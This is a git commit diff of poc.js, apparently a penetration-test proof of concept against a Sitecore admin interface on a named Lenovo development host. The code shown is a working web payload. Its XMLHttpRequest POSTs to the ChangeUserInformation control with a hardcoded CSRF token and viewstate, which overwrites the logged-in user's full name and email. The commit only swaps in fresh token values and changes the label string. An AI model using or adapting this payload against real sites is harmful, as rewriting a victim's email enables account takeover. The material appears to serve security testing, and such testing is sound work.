344b14235bec080bf7d5b5ece442b58a7606992c
portalstr <92850422+portalstr@users.noreply.github.com>
2021-11-07 17:08:08 +0200

    Update poc.js

--- poc.js
+++ poc.js
@@ -6,5 +6,5 @@ function handleResponse() {
     var changeReq = new XMLHttpRequest();
     changeReq.open('post', '/sitecore/shell/default.aspx?xmlcontrol=ChangeUserInformation', true);
     changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=366&__Y=578&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQyZGUwZDBiNy02N2NjLTQ4NjItODVkNS1lMGY0ZGIwMDUwZTAL&__VIEWSTATE=E8A06F5C2B9F4F29A9AE93E691D701D5&__VIEWSTATE=&Fullname=dxpPentetXSSPOC&Email=lr%40moc.moc')
+    changeReq.send('&__PARAMETERS=&__EVENTTARGET=OK&__EVENTARGUMENT=&__SOURCE=OK&__EVENTTYPE=click&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__SHIFTKEY=&__CTRLKEY=&__ALTKEY=&__BUTTON=0&__KEYCODE=undefined&__X=351&__Y=573&__URL=https%3A//cm.dxp-dev.lenovo.com/sitecore/shell/default.aspx%3Fxmlcontrol%3DChangeUserInformation&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACQ3ZWY0MmJkYS0wY2QzLTQzN2YtYWI0OC0yMDExN2VlZmYxZDQL&__VIEWSTATE=87BA08D6C2F74B3B9F6BA5C6E3156921&__VIEWSTATE=&Fullname=dxpPentestXSPOC&Email=lr%40moc.moc')
 };
